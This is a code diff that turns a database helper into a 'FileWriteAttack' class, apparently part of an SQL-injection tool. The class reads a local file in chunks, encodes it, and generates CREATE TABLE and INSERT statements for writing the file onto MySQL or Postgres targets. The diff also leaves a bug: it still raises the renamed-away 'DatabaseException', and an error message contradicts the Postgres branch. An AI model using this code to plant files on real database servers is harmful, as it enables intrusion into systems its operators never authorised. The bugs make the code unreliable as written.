@@ -4,36 +4,59 @@ import base64
 import random
 import string
 
+from .attack import Attack, AttackException
+
 log = logging.getLogger(__name__)
 
-class DatabaseException(Exception):
+class FileWriteAttackException(AttackException):
     pass
 
-class Database(object):
+class FileWriteAttack(Attack):
     '''Abstract the SQL statements per database implementation.'''
-    def __init__(self):
-        pass
 
-    def filewrite_sequence(self, db, pathfrom, pathto):
-        if db == 'mysql':
-            return self._filewrite_seq_mysql(pathfrom, pathto)
-        elif db == 'postgres':
-            return self._filewrite_seq_postgres(pathfrom, pathto)
+    attack_name = 'filewrite'
+
+    def __init__(self, conf_entry):
+        super(FileWriteAttack, self).__init__(conf_entry)
+
+        # prebuild the sql sequence. This may be better done one at a time so as to not
+        # read the whole file into memory. GTL fix this.
+        self.sqls = self._filewrite_sequence()
+
+    def _confirm_config(self):
+        '''Make sure the config has what we need for the file write attack.'''
+        super(FileWriteAttack, self)._confirm_config()
+        req = ['database', 'file_write', 'file_dest']
+        for r in req:
+            if not getattr(self, r, False):
+                raise FileWriteAttackException('Missing {} from config for File write attack.'.format(r))
+
+    def next_sql(self):
+        for s in self.sqls:
+            yield s
+
+    def _filewrite_sequence(self):
+        if self.database == 'mysql':
+            return self._filewrite_seq_mysql(self.file_write, self.file_dest)
+        elif self.database == 'postgres':
+            return self._filewrite_seq_postgres(self.file_write, self.file_dest)
 
         raise DatabaseException('file write attack only supported on mysql.')
 
     def _write_filedata(self, pathfrom, datatype='text', enc64=True):
         '''Take the given file and create a series of SQL statements that create a table
-        and write the file data to it. If end64 is True, use base64 encoding, otherwise
+        and write the file data to it. If enc64 is True, use base64 encoding, otherwise
         use hex encoding. datatype is the column datatype used for the table.
         Returns teh (random) table name and series of SQL statements.'''
         table = ''.join(random.choice(string.ascii_uppercase) for _ in range(16))
         statements = []
         statements.append('CREATE TABLE {} (data {})'.format(table, datatype))
-        chunk_len = 1024
-        with open(pathfrom, 'rb') as fd:
-            chunk = fd.read(chunk_len)
+        default_chunk_len = 1024
 
+        with open(pathfrom, 'rb') as fd:
+            chunk_len = default_chunk_len if not self._se.has_message_size() else self._se.message_size()
+            log.debug('Reading {} bytes from {}.'.format(chunk_len, pathfrom))
+            chunk = fd.read(chunk_len)
             if enc64:
                 data = base64.encodebytes(chunk).decode()     # the decode() decodes the python byte string.
             else:
@@ -41,6 +64,8 @@ class Database(object):
 
             statements.append('INSERT INTO {} (data) VALUES(\'{}\')'.format(table, data))
             while chunk:
+                chunk_len = default_chunk_len if not self._se.has_message_size() else self._se.message_size()
+                log.debug('Reading {} bytes from {}.'.format(chunk_len, pathfrom))
                 chunk = fd.read(chunk_len)
                 if chunk:
                     if enc64:
@@ -92,3 +117,6 @@ class Database(object):
         statements.append('drop table {}'.format(table))
 
         return statements
+
+    def handle_response(self):
+        log.info('Got response.')
